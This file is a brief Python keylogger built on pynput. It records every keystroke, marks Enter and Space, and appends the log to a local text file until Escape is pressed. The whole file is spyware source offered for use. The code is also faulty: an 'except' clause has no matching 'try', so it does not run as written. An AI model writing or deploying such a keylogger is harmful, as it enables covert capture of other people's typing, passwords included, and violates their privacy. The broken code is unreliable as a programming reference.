from pynput.keyboard import Listener, Key

def on_press(key):
    global f
    if hasattr(key, 'char'):
        f.write(key.char)
    elif key == Key.enter:
        f.write('[ENTER]')
    elif key == Key.space:
        f.write('[SPACE]')
    elif key == Key.esc:
        return False
    except Exception as e:
        print(f'Error writing to file: {e}')

def main():
    global f
    try:
        with open('keylogs.txt', 'a') as f:
            with Listener(on_press=on_press) as listener:
                listener.join()
    except Exception as e:
        print(f'Error in keylogger setup: {e}')
    finally:
        if 'f' in locals() and not f.closed:
            f.close()

if __name__ == '__main__':
    main()
